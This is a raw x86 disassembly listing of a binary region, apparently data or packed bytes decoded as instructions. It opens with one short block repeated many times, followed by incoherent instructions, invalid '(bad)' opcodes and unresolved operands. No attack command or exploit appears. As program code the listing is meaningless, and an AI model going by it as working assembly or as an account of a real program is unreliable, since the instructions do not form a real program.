  421b74:	arpl   WORD PTR [ecx+0x23],sp
  421b77:	sub    al,0x9d
  421b79:	out    0x6e,eax
  421b7b:	and    DWORD PTR [ebx-0x53],esi
  421b7e:	mov    WORD PTR [esi+0x4a],?
  421b81:	arpl   WORD PTR [ecx+0x23],sp
  421b84:	sub    al,0x9d
  421b86:	out    0x6e,eax
  421b88:	and    DWORD PTR [ebx-0x53],esi
  421b8b:	mov    WORD PTR [esi+0x4a],?
  421b8e:	arpl   WORD PTR [ecx+0x23],sp
  421b91:	sub    al,0x9d
  421b93:	out    0x6e,eax
  421b95:	and    DWORD PTR [ebx-0x53],esi
  421b98:	mov    WORD PTR [esi+0x4a],?
  421b9b:	arpl   WORD PTR [ecx+0x23],sp
  421b9e:	sub    al,0x9d
  421ba0:	out    0x6e,eax
  421ba2:	and    DWORD PTR [ebx-0x53],esi
  421ba5:	mov    WORD PTR [esi+0x4a],?
  421ba8:	arpl   WORD PTR [ecx+0x23],sp
  421bab:	sub    al,0x9d
  421bad:	out    0x6e,eax
  421baf:	and    DWORD PTR [ebx-0x53],esi
  421bb2:	mov    WORD PTR [esi+0x4a],?
  421bb5:	arpl   WORD PTR [ecx+0x23],sp
  421bb8:	sub    al,0x9d
  421bba:	out    0x6e,eax
  421bbc:	and    DWORD PTR [ebx-0x53],esi
  421bbf:	mov    WORD PTR [esi+0x4a],?
  421bc2:	arpl   WORD PTR [ecx+0x23],sp
  421bc5:	sub    al,0x9d
  421bc7:	out    0x6e,eax
  421bc9:	and    DWORD PTR [ebx-0x53],esi
  421bcc:	mov    WORD PTR [esi+0x4a],?
  421bcf:	arpl   WORD PTR [ecx+0x23],sp
  421bd2:	sub    al,0x9d
  421bd4:	out    0x6e,eax
  421bd6:	and    DWORD PTR [ebx-0x53],esi
  421bd9:	mov    WORD PTR [esi+0x4a],?
  421bdc:	arpl   WORD PTR [ecx+0x23],sp
  421bdf:	sub    al,0x9d
  421be1:	out    0x6e,eax
  421be3:	and    DWORD PTR [ebx-0x53],esi
  421be6:	mov    WORD PTR [esi+0x4a],?
  421be9:	arpl   WORD PTR [ecx+0x23],sp
  421bec:	sub    al,0x9d
  421bee:	out    0x6e,eax
  421bf0:	and    DWORD PTR [ebx-0x53],esi
  421bf3:	mov    WORD PTR [esi+0x4a],?
  421bf6:	arpl   WORD PTR [ecx+0x23],sp
  421bf9:	sub    al,0x9d
  421bfb:	out    0x6e,eax
  421bfd:	and    DWORD PTR [ebx-0x53],esi
  421c00:	mov    WORD PTR [esi+0x4a],?
  421c03:	arpl   WORD PTR [ecx+0x23],sp
  421c06:	sub    al,0x9d
  421c08:	out    0x6e,eax
  421c0a:	and    DWORD PTR [ebx-0x53],esi
  421c0d:	mov    WORD PTR [esi+0x4a],?
  421c10:	arpl   WORD PTR [ecx+0x23],sp
  421c13:	sub    al,0x9d
  421c15:	out    0x6e,eax
  421c17:	and    DWORD PTR [ebx-0x53],esi
  421c1a:	mov    WORD PTR [esi+0x4a],?
  421c1d:	arpl   WORD PTR [ecx+0x23],sp
  421c20:	sub    al,0x9d
  421c22:	out    0x6e,eax
  421c24:	and    DWORD PTR [ebx-0x53],esi
  421c27:	mov    WORD PTR [esi+0x4a],?
  421c2a:	arpl   WORD PTR [ecx+0x23],sp
  421c2d:	sub    al,0x9d
  421c2f:	out    0x6e,eax
  421c31:	and    DWORD PTR [ebx-0x53],esi
  421c34:	mov    WORD PTR [esi+0x4a],?
  421c37:	arpl   WORD PTR [ecx+0x23],sp
  421c3a:	sub    al,0x9d
  421c3c:	out    0x6e,eax
  421c3e:	and    DWORD PTR [ebx-0x53],esi
  421c41:	mov    WORD PTR [esi+0x4a],?
  421c44:	arpl   WORD PTR [ecx+0x23],sp
  421c47:	sub    al,0x9d
  421c49:	out    0x6e,eax
  421c4b:	and    DWORD PTR [ebx-0x53],esi
  421c4e:	mov    WORD PTR [esi+0x4a],?
  421c51:	arpl   WORD PTR [ecx+0x23],sp
  421c54:	sub    al,0x9d
  421c56:	out    0x6e,eax
  421c58:	and    DWORD PTR [ebx-0x53],esi
  421c5b:	mov    WORD PTR [esi+0x4a],?
  421c5e:	arpl   WORD PTR [ecx+0x23],sp
  421c61:	sub    al,0x9d
  421c63:	out    0x6e,eax
  421c65:	and    DWORD PTR [ebx-0x53],esi
  421c68:	mov    WORD PTR [esi+0x4a],?
  421c6b:	arpl   WORD PTR [ecx+0x23],sp
  421c6e:	sub    al,0x9d
  421c70:	out    0x6e,eax
  421c72:	and    DWORD PTR [ebx-0x53],esi
  421c75:	mov    WORD PTR [esi+0x4a],?
  421c78:	arpl   WORD PTR [ecx+0x23],sp
  421c7b:	sub    al,0x9d
  421c7d:	out    0x6e,eax
  421c7f:	and    DWORD PTR [ebx-0x53],esi
  421c82:	mov    WORD PTR [esi+0x4a],?
  421c85:	arpl   WORD PTR [ecx+0x23],sp
  421c88:	sub    al,0x9d
  421c8a:	out    0x6e,eax
  421c8c:	and    DWORD PTR [ebx-0x53],esi
  421c8f:	mov    WORD PTR [esi+0x4a],?
  421c92:	arpl   WORD PTR [ecx+0x23],sp
  421c95:	sub    al,0x9d
  421c97:	out    0x6e,eax
  421c99:	and    DWORD PTR [ebx-0x53],esi
  421c9c:	mov    WORD PTR [esi+0x4a],?
  421c9f:	arpl   WORD PTR [ecx+0x23],sp
  421ca2:	sub    al,0x9d
  421ca4:	out    0x6e,eax
  421ca6:	and    DWORD PTR [ebx-0x53],esi
  421ca9:	mov    WORD PTR [esi+0x4a],?
  421cac:	and    al,0x8f
  421cae:	sub    DWORD PTR [edx+esi*4],ebp
  421cb1:	out    0x6e,eax
  421cb3:	xor    DWORD PTR [ebx-0x53],esi
  421cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cb7:	aam    0x90
  421cb9:	adc    al,BYTE PTR [edi]
  421cbb:	fadd   QWORD PTR [ecx]
  421cbd:	add    esp,DWORD PTR [eax+0x3e]
  421cc0:	int3   
  421cc1:	inc    ebp
  421cc2:	inc    ebp
  421cc3:	lahf   
  421cc4:	ret    0x5df
  421cc7:	adc    BYTE PTR [edi-0x26a9718a],ah
  421ccd:	aaa    
  421cce:	push   ds
  421ccf:	dec    ecx
  421cd0:	push   es
  421cd1:	test   DWORD PTR [ebp+ecx*2-0x5bec4cfd],0x649021d4
  421cdc:	(bad)  
  421cdd:	mov    WORD PTR [ecx-0x13],ss
  421ce0:	jmp    0x421d16
  421ce2:	jb     0x421d25
  421ce4:	xor    al,0xd5
  421ce6:	push   ebx
  421ce7:	cld    
  421ce8:	addr16 sbb al,0xec
  421ceb:	adc    WORD PTR [ebp+0x70],ax
  421cef:	int3   
  421cf0:	inc    ebp
  421cf1:	cmp    al,0x8b
  421cf3:	mov    DWORD PTR [ebx+0x22016a5f],ebx
  421cf9:	mov    ah,0x55
  421cfb:	adc    esi,ebp
  421cfd:	mov    ch,0x9f
  421cff:	inc    edi
  421d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d01:	and    eax,0x6ab3d4e4
  421d06:	aas    
  421d07:	jle    0x421cd9
  421d09:	(bad)  
  421d0a:	sti    
  421d0b:	push   es
  421d0c:	aas    
  421d0d:	sub    DWORD PTR [ebx+0x7f],ebp
  421d10:	in     al,0x81
  421d12:	sbb    dh,al
  421d14:	jmp    0x7c148885
  421d19:	adc    BYTE PTR [ebx+0x2b],dl
  421d1c:	push   ss
  421d1d:	sti    
  421d1e:	cmp    dh,BYTE PTR [ebp-0xafe5c2c]
  421d24:	fiadd  WORD PTR [bp+di]
  421d27:	mov    eax,cs
  421d29:	mov    ds:0x61ae0fe6,eax
  421d2e:	ret    
  421d2f:	gs enter 0x3a7,0xa3
  421d34:	mov    esi,?
  421d36:	add    DWORD PTR [esi-0x4c66a475],ecx
  421d3c:	inc    eax
  421d3d:	inc    esi
  421d3e:	jbe    0x421d15
  421d40:	fnstcw WORD PTR [edi]
  421d42:	mov    ds:0x9d58eebf,al
  421d47:	dec    eax
  421d48:	mov    edi,DWORD PTR [ebx-0x35321117]
  421d4e:	dec    eax
  421d4f:	outs   dx,DWORD PTR ds:[esi]
  421d50:	lds    edx,FWORD PTR [esi-0x23766d0f]
  421d56:	in     al,0x73
  421d58:	mov    dl,0xfe
  421d5a:	aad    0x45
  421d5c:	nop
  421d5d:	test   BYTE PTR [edx+0x71],al
  421d60:	(bad)  
  421d61:	lods   eax,DWORD PTR ds:[esi]
  421d62:	nop
  421d63:	out    dx,eax
  421d64:	call   0x50d12df
  421d69:	and    eax,0xf0cb2389
  421d6e:	rcr    BYTE PTR [ecx-0x1],cl
  421d71:	aad    0x25
  421d73:	sbb    ecx,DWORD PTR [esi+0x67]
  421d76:	hlt    
  421d77:	mov    ebp,0x9ea62b0e
  421d7c:	jge    0x421d42
  421d7e:	add    esi,esi
  421d80:	inc    ebp
  421d81:	cmp    al,0x52
  421d83:	adc    eax,0xc6ef4141
  421d88:	and    eax,0x573e8372
  421d8d:	leave  
  421d8e:	xor    edi,DWORD PTR [eax+esi*4]
  421d91:	pop    esi
  421d92:	cmp    eax,0xe7dd24b5
  421d97:	stos   BYTE PTR es:[edi],al
  421d98:	lock mov al,BYTE PTR [esi-0x60]
  421d9c:	inc    ebp
  421d9d:	jp     0x421d7f
  421d9f:	imul   edi,DWORD PTR [esi],0xbad1e284
  421da5:	lahf   
  421da6:	das    
  421da7:	mov    BYTE PTR [ebp+edi*1-0x3dd38a66],0xe9
  421daf:	rol    DWORD PTR [eax],cl
  421db1:	jg     0x421e11
  421db3:	das    
  421db4:	adc    cl,ah
  421db6:	(bad)
  421db9:	ja     0x421d79
  421dbb:	adc    BYTE PTR [esp+ebp*1],cl
  421dbe:	(bad)  
  421dbf:	or     BYTE PTR [ebx-0x910ee65],bh
  421dc5:	in     eax,dx
  421dc6:	xchg   DWORD PTR ds:0x314966e7,ebx
  421dcc:	popw   ss
  421dce:	add    ecx,DWORD PTR [eax]
  421dd0:	jns    0x421d84
  421dd2:	popf   
  421dd3:	mov    esi,0x9f48b631
  421dd8:	xchg   edi,eax
  421dd9:	mov    esi,0x9f054e48
  421dde:	inc    ebp
  421ddf:	push   0x14
  421de1:	popa   
  421de2:	(bad)  
  421de3:	rdtsc  
  421de5:	cdq    
  421de6:	sbb    cl,cl
  421de8:	xchg   edi,eax
  421de9:	sbb    BYTE PTR [edx+0x57],al
  421dec:	inc    ebx
  421ded:	fsub   DWORD PTR [esi-0x69]
  421df0:	adc    edx,DWORD PTR [esi-0x65051f69]
  421df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421df7:	cmp    al,0x88
  421df9:	sbb    ebx,DWORD PTR [ebp-0x7e]
  421dfc:	jp     0x421e74
  421dfe:	jbe    0x421e24
  421e00:	mov    es,ebx
  421e02:	pop    ecx
  421e03:	jb     0x421dbd
  421e05:	push   0xffffff80
  421e07:	push   eax
  421e08:	repnz sar BYTE PTR [ebx-0x61f56923],1
  421e0f:	pop    esp
  421e10:	cmp    eax,0xffffffcc
  421e13:	rcr    BYTE PTR [edx+edi*4-0x6d],1
  421e17:	stos   BYTE PTR es:[edi],al
  421e18:	(bad)  [ebx]
  421e1a:	stos   DWORD PTR es:[edi],eax
  421e1b:	inc    ebx
  421e1c:	cs jl  0x421da1
  421e1f:	sub    al,cl
  421e21:	repnz sub edx,0xbcf49259
  421e28:	xchg   edi,eax
  421e29:	jnp    0x421e41
  421e2b:	scas   eax,DWORD PTR es:[edi]
  421e2c:	add    DWORD PTR ds:0xd0289399,ecx
  421e32:	pop    edi
  421e33:	imul   eax,DWORD PTR [eax+0x0],0x7c
  421e37:	dec    ebp
  421e38:	and    al,0x45
  421e3a:	dec    esi
  421e3b:	ficom  WORD PTR [ebx+0x2cb9d88b]
  421e41:	stc    
  421e42:	push   edx
  421e43:	mov    ah,0x23
  421e45:	cmp    al,0xb5
  421e47:	int3   
  421e48:	je     0x421e35
  421e4a:	icebp  
  421e4b:	adc    DWORD PTR [ebx-0x7f2a6bf9],0x4
  421e52:	scas   eax,DWORD PTR es:[edi]
  421e53:	pushf  
  421e54:	in     al,0xe5
  421e56:	lock fidivr WORD PTR [esi+eiz*8-0x7a]
  421e5b:	cdq    
  421e5c:	cmp    DWORD PTR [edx],ebp
  421e5e:	hlt    
  421e5f:	add    al,bh
  421e61:	and    al,0x28
  421e63:	and    al,0xb9
  421e65:	xor    DWORD PTR [ecx*2+0x4942d923],eax
  421e6c:	add    al,0xb
  421e6e:	rcr    DWORD PTR [ebx+0x63],0x87
  421e72:	xchg   ebx,eax
  421e73:	inc    ecx
  421e74:	fist   WORD PTR [ebx-0x76]
  421e77:	imul   edx,DWORD PTR [ecx+ecx*8-0x11],0x5d4089dd
  421e7f:	sar    DWORD PTR [edi-0x7b],0x39
  421e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e84:	inc    eax
  421e85:	gs push ebx
  421e87:	adc    eax,DWORD PTR [esp+eiz*8-0x24aa80d7]
  421e8e:	cmp    BYTE PTR ds:0xdcbb6852,0xd5
  421e95:	sti    
  421e96:	add    al,0x82
  421e98:	bound  ecx,QWORD PTR [ebp+0x2fdb3583]
  421e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e9f:	cli    
  421ea0:	gs pop ecx
  421ea2:	in     al,0xc2
  421ea4:	xor    DWORD PTR [edx],0x4
  421ea7:	add    eax,0x6aa44f74
  421eac:	lds    esp,FWORD PTR [esi-0x3]
  421eaf:	cs sahf 
  421eb1:	jne    0x421e93
  421eb3:	fistp  QWORD PTR es:[ebp-0x1d]
  421eb7:	cmp    esp,DWORD PTR [esi-0x67764504]
  421ebd:	sub    bl,BYTE PTR [ecx]
  421ebf:	xor    BYTE PTR [edi],bh
  421ec1:	or     al,ah
  421ec3:	loopne 0x421e75
  421ec5:	or     edx,0xffffff91
  421ec8:	out    dx,al
  421ec9:	nop
  421eca:	test   BYTE PTR [ebx-0x29],dl
  421ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ece:	or     edx,ebx
  421ed0:	repnz aam 0x4c
  421ed3:	icebp  
  421ed4:	in     eax,dx
  421ed5:	lds    edi,FWORD PTR [eax+0x5e6d2c5c]
  421edb:	nop    DWORD PTR [edx+0x7a]
  421edf:	xlat   BYTE PTR ds:[ebx]
  421ee0:	loop   0x421ebb
  421ee2:	fwait
  421ee3:	push   ds
  421ee4:	jmp    0xb9a8:0x6c153075
  421eeb:	sub    cl,BYTE PTR [eax+ebx*4+0x651f8502]
  421ef2:	push   cs
  421ef3:	sub    ah,al
  421ef5:	stos   BYTE PTR es:[edi],al
  421ef6:	jp     0x421e8f
  421ef8:	push   0xca2056ce
  421efd:	test   eax,0x476041ca
  421f02:	mov    esi,0x60a020e7
  421f07:	mov    DWORD PTR [eax+ebp*8],edi
  421f0a:	pop    esp
  421f0b:	mov    ecx,?
  421f0d:	dec    ebx
  421f0e:	das    
  421f0f:	rol    BYTE PTR [edx+0x5f43d156],cl
  421f15:	(bad)  
  421f16:	mov    ebp,0x7f3170e1
  421f1b:	jbe    0x421f7b
  421f1d:	mov    ds:0x1940cd8a,eax
  421f22:	add    eax,0x8d5826e2
  421f27:	dec    edx
  421f28:	ror    DWORD PTR [ecx+0x59],cl
  421f2b:	dec    ebp
  421f2c:	retf   
  421f2d:	in     eax,dx
  421f2e:	je     0x421eb5
  421f30:	ret    0x9163
  421f33:	dec    ecx
  421f34:	pop    ebx
  421f35:	mov    al,ds:0xb42e8918
  421f3a:	jmp    0xce86:0x7f75f78f
  421f41:	loopne 0x421fba
  421f43:	dec    edx
  421f44:	fdivr  DWORD PTR [ecx+0x4b3b3ac]
  421f4b:	add    bh,BYTE PTR [eax]
  421f4d:	popf   
  421f4e:	shl    DWORD PTR [ebx-0x5b],cl
  421f51:	(bad)  
  421f52:	cmp    eax,DWORD PTR [ebx-0x5008c4a5]
  421f58:	xchg   edi,eax
  421f59:	push   edi
  421f5a:	or     BYTE PTR [ecx+0x40755751],ah
  421f60:	mov    BYTE PTR [esi+0x59],ah
  421f63:	ret    0xe231
  421f66:	push   ss
  421f67:	pop    edi
  421f68:	xchg   ebx,eax
  421f69:	cmp    al,0x7a
  421f6b:	xor    BYTE PTR [edx-0x1933693f],0x97
  421f72:	xchg   BYTE PTR [edi-0x15],bl
  421f75:	adc    al,0xa0
  421f77:	add    edx,DWORD PTR [ebx-0xc]
  421f7a:	mov    bh,0x21
  421f7c:	add    eax,DWORD PTR [ebp+ebp*8+0x3b]
  421f80:	push   es
  421f81:	pop    es
  421f82:	push   ecx
  421f83:	dec    eax
  421f84:	fbld   TBYTE PTR [esi+ebp*4]
  421f87:	jg     0x421fa3
  421f89:	dec    esp
  421f8a:	cs cmp dl,cl
  421f8d:	pop    edx
  421f8e:	cmp    ecx,0x27
  421f91:	jg     0x421f2b
  421f93:	adc    ah,0xf0
  421f96:	stos   DWORD PTR es:[edi],eax
  421f97:	fwait
  421f98:	shr    DWORD PTR [edi],1
  421f9a:	jp     0x421fdc
  421f9c:	rol    edx,1
  421f9e:	lea    esp,[esi]
  421fa0:	out    dx,eax
  421fa1:	adc    BYTE PTR [eax-0x54],cl
  421fa4:	inc    eax
  421fa5:	mov    al,0x20
  421fa7:	neg    DWORD PTR [ecx-0x3e6f9fd1]
  421fad:	test   al,0x57
  421faf:	das    
  421fb0:	loopne 0x421fc6
  421fb2:	(bad)  
  421fb3:	fcmovu st,st(3)
  421fb5:	or     bh,cl
  421fb7:	adc    ebp,esp
  421fb9:	or     ebx,DWORD PTR [edx]
  421fbb:	and    DWORD PTR [edx+edi*1],ebx
  421fbe:	ins    BYTE PTR es:[edi],dx
  421fbf:	xor    DWORD PTR [ebp+0x61],esp
  421fc2:	or     al,0x96
  421fc4:	and    edi,DWORD PTR [edx]
  421fc6:	ret    0xae7f
  421fc9:	out    0xc9,al
  421fcb:	cmp    esi,ecx
  421fcd:	pop    edx
  421fce:	sbb    al,dl
  421fd0:	loope  0x421fdc
  421fd2:	sbb    ebx,eax
  421fd4:	fldcw  WORD PTR [ebx-0x77]
  421fd7:	out    0x2,eax
  421fd9:	mov    ds:0xc8245e7f,al
  421fde:	push   ss
  421fdf:	dec    ebp
  421fe0:	inc    edi
  421fe1:	fnstenv [esi+edx*8-0x7ac72d81]
  421fe8:	dec    edi
  421fe9:	mov    dl,BYTE PTR [esi-0x11]
  421fec:	sti    
  421fed:	xchg   ecx,eax
  421fee:	cwde   
  421fef:	sub    dh,BYTE PTR ds:0x55799868
  421ff5:	dec    edx
  421ff6:	lahf   
  421ff7:	inc    edi
  421ff8:	lods   al,BYTE PTR fs:[esi]
  421ffa:	adc    DWORD PTR [esi+0xc],0x5e
  421ffe:	es cmp eax,0x94b44480
  422004:	lods   eax,DWORD PTR ds:[esi]
  422005:	mov    cl,0x9b
  422007:	jb     0x421fbc
  422009:	out    0xc8,eax
  42200b:	stos   BYTE PTR es:[edi],al
  42200c:	jo     0x421fc4
  42200e:	outs   dx,BYTE PTR ds:[esi]
  42200f:	bound  ecx,QWORD PTR [ebx]
  422011:	cmp    esi,eax
  422013:	lea    ecx,[edx-0x8]
  422016:	mov    esi,0x9678f67c
  42201b:	pop    ebx
  42201c:	mov    eax,0xe8f4cc52
  422021:	adc    DWORD PTR [esi+0x58a6d3f1],eax
  422027:	cmp    ecx,esi
  422029:	data16 aas 
  42202b:	or     ch,BYTE PTR [edi+0x4ddb00c7]
  422031:	xor    ebp,eax
  422033:	daa    
  422034:	cld    
  422035:	mov    ch,0xf0
  422037:	mov    edi,0x8a236faf
  42203c:	mov    cl,0x71
  42203e:	pop    ebp
  42203f:	push   ecx
  422040:	mov    al,0xcb
  422042:	pop    esp
  422043:	stos   DWORD PTR es:[edi],eax
  422044:	(bad)  
  422045:	jp     0x42206f
  422047:	mov    WORD PTR [eax],?
  422049:	mov    ds:0x67933b,eax
  42204e:	frstor [esi+eiz*4]
  422051:	fs jbe 0x422003
  422054:	(bad)  
  422055:	das    
  422056:	fstp   DWORD PTR [esp+ebx*4]
  422059:	xor    DWORD PTR [edx],esp
  42205b:	out    0x94,eax
  42205d:	je     0x422058
  42205f:	shl    DWORD PTR [ebp+0x7e796358],0xd4
  422066:	into   
  422067:	xor    eax,edx
  422069:	js     0x42205f
  42206b:	cs icebp 
  42206d:	imul   esi,edi,0x67e10371
  422073:	sub    ah,BYTE PTR [ebx]
  422075:	and    esi,DWORD PTR cs:0x98a7bf1d
  42207c:	xchg   ebp,eax
  42207d:	jno    0x422058
  42207f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422080:	jp     0x4220ff
  422082:	jmp    0xabe1:0xbf388d8c
  422089:	aaa    
  42208a:	xor    eax,0x20419564
  42208f:	lea    esp,[ebx-0x48c53922]
  422095:	pop    ds
  422096:	cmp    al,bh
  422098:	fldcw  WORD PTR [edi+0x5df8709d]
  42209e:	sti    
  42209f:	pusha  
  4220a0:	(bad)  
  4220a2:	stos   DWORD PTR es:[edi],eax
  4220a3:	adc    DWORD PTR [esi],edx
  4220a5:	iret   
  4220a6:	bound  ebx,QWORD PTR [eax+edx*4-0x363bb591]
  4220ad:	cmp    edi,edx
  4220af:	ja     0x422036
  4220b1:	xor    al,0xda
  4220b3:	adc    ebp,0xd0beca
  4220b9:	leave  
  4220ba:	std    
  4220bb:	dec    ebp
  4220bc:	push   esi
  4220bd:	lods   al,BYTE PTR ds:[esi]
  4220be:	std    
  4220bf:	fidiv  DWORD PTR [esi]
  4220c1:	call   0x2926fc1e
  4220c6:	sub    dh,BYTE PTR [ecx+0x32f068c3]
  4220cc:	jl     0x422097
  4220ce:	rol    DWORD PTR [eax],cl
  4220d0:	gs sbb bl,0x7
  4220d4:	loopne 0x422079
  4220d6:	lea    ebx,[edi-0x2a]
  4220d9:	sbb    eax,0x1d175b91
  4220de:	push   cs
  4220df:	int3   
  4220e0:	push   0x7a
  4220e2:	enter  0x3c64,0x1b
  4220e6:	sar    BYTE PTR [ecx-0x581d2e7],1
  4220ec:	xor    eax,0x48b814ef
  4220f1:	jp     0x4220a9
  4220f3:	push   cs
  4220f4:	pop    edi
  4220f5:	enter  0x5c29,0x17
  4220f9:	mov    BYTE PTR [ebx],dl
  4220fb:	(bad)  
  4220fc:	repz xchg edi,eax
  4220fe:	cmp    ebp,ebp
  422100:	add    eax,0x222b6f9a
  422105:	ret    
  422106:	adc    DWORD PTR [eax-0x43],ebp
  422109:	stos   DWORD PTR es:[edi],eax
  42210a:	xchg   esi,eax
  42210b:	call   0x93c9:0x6096fcd4
  422112:	int    0x7c
  422114:	pop    edx
  422115:	sub    eax,0x3c97d9ee
  42211a:	scas   al,BYTE PTR es:[edi]
  42211b:	mov    al,ds:0xc8f9182f
  422120:	mov    edi,0x3b4a744e
  422125:	loope  0x4220cc
  422127:	cmp    edi,DWORD PTR [esi+ecx*2]
  42212a:	xor    eax,0xb3ea0a0e
  42212f:	fcom   QWORD PTR [ecx-0x43]
  422132:	or     al,0xfe
  422134:	sbb    edx,DWORD PTR [esi-0x31]
  422137:	rcr    DWORD PTR [edx+0x77],cl
  42213a:	pop    es
  42213b:	mov    esi,0x7177d51a
  422140:	scas   al,BYTE PTR es:[edi]
  422141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422142:	mov    ebp,DWORD PTR ds:0xac249e73
  422148:	lods   eax,DWORD PTR ds:[esi]
  422149:	enter  0xfd6a,0xc2
  42214d:	in     ax,dx
  42214f:	sub    bl,ah
  422151:	loop   0x4221a8
  422153:	in     al,dx
  422154:	mov    eax,ds:0x3f3648d7
  422159:	mov    eax,ds:0xa84eab95
  42215e:	jmp    0x42217d
  422160:	cmp    DWORD PTR [edx],edx
  422162:	inc    eax
  422163:	mov    bh,0xfe
  422165:	mov    al,ds:0xd25ea7e3
  42216a:	add    bl,BYTE PTR [esi+0x22]
  42216d:	vpsubb xmm5,xmm3,xmm2
  422171:	xor    BYTE PTR [ebp+0x14],cl
  422174:	lea    ebx,[ecx]
  422176:	(bad)  [edi-0x7e9a9290]
  42217c:	aad    0xf9
  42217e:	mov    ecx,0x9c04d073
  422183:	jmp    0x66ba:0x9b8d564
  42218a:	lods   eax,DWORD PTR ds:[esi]
  42218b:	fisubr WORD PTR [ecx+0x1847b9b9]
  422191:	repnz mov WORD PTR [eax],ds
  422194:	pop    es
  422195:	xlat   BYTE PTR ds:[ebx]
  422196:	out    dx,al
  422197:	cld    
  422198:	out    0x72,al
  42219a:	neg    ebp
  42219c:	fst    QWORD PTR [ecx-0x54]
  42219f:	add    dh,BYTE PTR [eax+edx*4+0x7e]
  4221a3:	(bad)
  4221a6:	scas   al,BYTE PTR es:[edi]
  4221a7:	enter  0xa2ee,0x1a
  4221ab:	bound  edx,QWORD PTR [eax]
  4221ad:	aaa    
  4221ae:	xchg   ebx,eax
  4221af:	push   ss
  4221b0:	hlt    
  4221b1:	jge    0x4221ee
  4221b3:	sub    esi,edx
  4221b5:	sbb    BYTE PTR [ecx],0x7
  4221b8:	loop   0x422216
  4221ba:	fdivp  st(1),st
  4221bc:	cmc    
  4221bd:	fcomp  DWORD PTR ds:0x18688030
  4221c3:	(bad)  
  4221c4:	or     eax,0xd2016d42
  4221c9:	jecxz  0x4221d8
  4221cb:	fiadd  WORD PTR [edi]
  4221cd:	int    0x1b
  4221cf:	ins    DWORD PTR es:[edi],dx
  4221d0:	xchg   ecx,eax
  4221d1:	jge    0x4221ba
  4221d3:	inc    ecx
  4221d4:	dec    ecx
  4221d5:	jns    0x4221ec
  4221d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d8:	icebp  
  4221d9:	or     BYTE PTR [ebx+0x3ecd727],ch
  4221df:	cmp    esp,DWORD PTR [ebx+eax*2-0x2d499b18]
  4221e6:	xchg   ebx,eax
  4221e7:	ret    
  4221e8:	sbb    ebx,DWORD PTR [eax-0x6]
  4221eb:	jg     0x422235
  4221ed:	sbb    eax,0x6ce21bf2
  4221f2:	in     al,0xda
  4221f4:	cmc    
  4221f5:	inc    edi
  4221f6:	ins    BYTE PTR es:[edi],dx
  4221f7:	arpl   WORD PTR ds:0xcb8ecb57,cx
  4221fd:	sbb    al,0xbe
  4221ff:	scas   al,BYTE PTR es:[edi]
  422200:	jp     0x422277
  422202:	test   eax,0xa9bf086f
  422207:	inc    esp
  422208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422209:	enter  0x9a2a,0x63
  42220d:	mov    DWORD PTR [ecx+0x21a3969e],edi
  422213:	push   esp
  422214:	cmp    BYTE PTR [ecx],al
  422216:	lahf   
  422217:	xor    eax,0xc848dbac
  42221c:	gs shl esp,0xe1
  422220:	add    dh,BYTE PTR [ebp-0x56]
  422223:	mov    dh,0x1d
  422225:	scas   al,BYTE PTR es:[edi]
  422226:	sbb    esi,DWORD PTR [edi+0x648deca8]
  42222c:	outs   dx,BYTE PTR ds:[esi]
  42222d:	loopne 0x42221c
  42222f:	mov    eax,ds:0xfa4622d8
  422234:	shl    DWORD PTR [edx+0x5e1b1790],cl
  42223a:	inc    ebp
  42223b:	push   cs
  42223c:	fwait
  42223d:	mov    ah,0xd1
  42223f:	inc    esi
  422240:	repnz pop ebx
  422242:	dec    edi
  422243:	popf   
  422244:	adc    BYTE PTR [esi-0x6fcf2a89],dh
  42224a:	imul   esp,DWORD PTR ds:0x57f68d9e,0x2d
  422251:	pop    eax
  422252:	cmp    DWORD PTR [ebx-0x23],0x6d
  422256:	inc    edi
  422257:	sbb    eax,0x7d798d88
  42225c:	mov    bh,0x60
  42225e:	or     al,0xaa
  422260:	jbe    0x42226b
  422262:	pop    es
  422263:	cmp    eax,edi
  422265:	dec    ebp
  422266:	mov    dl,BYTE PTR [edx+0x35a34125]
  42226c:	xor    BYTE PTR [esi],dl
  42226e:	mov    BYTE PTR [esi-0x3b],dh
  422271:	ror    DWORD PTR [esi+0x36],1
  422274:	push   eax
  422275:	test   eax,esp
  422277:	aas    
  422278:	popa   
  422279:	cs sbb al,ch
  42227c:	cli    
  42227d:	cmp    eax,0xe4ae0706
  422282:	xchg   esi,eax
  422283:	add    al,0x62
  422285:	push   ss
  422286:	mov    al,ds:0xad515225
  42228b:	push   0xffffffdd
  42228d:	jl     0x4222f5
  42228f:	mov    edx,0x57e0fd13
  422294:	fmul   st,st(6)
  422296:	in     eax,dx
  422297:	pop    ds
  422298:	sub    ebx,DWORD PTR [esp+ebx*2]
  42229b:	pop    eax
  42229c:	adc    al,0x12
  42229e:	dec    ebx
  42229f:	jmp    0xb3ee:0x5f42332d
  4222a6:	outs   dx,BYTE PTR ds:[esi]
  4222a7:	ret    0x3cce
  4222aa:	mov    eax,0x24df0f15
  4222af:	dec    BYTE PTR [ebp+0xcdb3300]
  4222b5:	mov    eax,0x88cfc960
  4222ba:	icebp  
  4222bb:	inc    edi
  4222bc:	add    eax,0x2a219ff1
  4222c1:	or     eax,0x7e504c45
  4222c6:	call   0x110014fb
  4222cb:	and    dl,cl
  4222cd:	pop    edx
  4222ce:	jns    0x4222ea
  4222d0:	xor    eax,0x1a979ba5
  4222d5:	xlat   BYTE PTR ds:[ebx]
  4222d6:	push   ecx
  4222d7:	jge    0x422266
  4222d9:	pop    ss
  4222da:	jmp    0x422264
  4222dc:	adc    edi,DWORD PTR [ebp-0x1611696c]
  4222e2:	popf   
  4222e3:	cmp    eax,0xe938ecb5
  4222e8:	jns    0x422356
  4222ea:	aam    0xc3
  4222ec:	ins    BYTE PTR es:[edi],dx
  4222ed:	add    eax,DWORD PTR [ebx+eax*4-0x77]
  4222f1:	mov    ebx,0x419e0f52
  4222f6:	xchg   ebp,eax
  4222f7:	repnz into 
  4222f9:	mov    al,ds:0x26ec0b5e
